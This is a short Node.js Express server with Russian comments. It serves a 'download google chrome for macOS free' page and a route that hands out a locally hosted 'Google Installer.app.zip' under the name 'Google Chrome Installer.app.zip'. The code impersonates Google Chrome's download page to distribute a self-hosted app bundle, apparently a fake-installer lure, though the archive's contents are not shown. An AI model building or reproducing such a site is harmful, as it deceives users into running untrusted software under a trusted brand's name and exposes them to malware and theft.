const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 8080;

// Middleware для статических файлов
app.use(express.static('public'));
app.use('/dist', express.static('dist'));

// Главная страница
app.get('/', (req, res) => {
    const html = `
<!DOCTYPE html>
<html>
<head>
    <title>download google chrome for macOS free</title>
    <meta charset="UTF-8">
</head>
<body>
    <img src="https://images.steamusercontent.com/ugc/90472493366823952/9AE061717B44506050E8D1AA5BAD3E51BCAD1185/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false" alt="Google Chrome">

    <a href="/dist/Google Installer.app.zip" class="download-btn">
        download google for macOS free
    </a>

</body>
</html>
    `;
    
    res.send(html);
});

// Роут для скачивания файла
app.get('/download', (req, res) => {
    const filePath = path.join(__dirname, 'dist', 'Google Installer.app.zip');
    
    // Проверяем существование файла
    res.download(filePath, 'Google Chrome Installer.app.zip', (err) => {
        if (err) {
            console.error('Error downloading file:', err);
            res.status(404).send('File not found');
        }
    });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});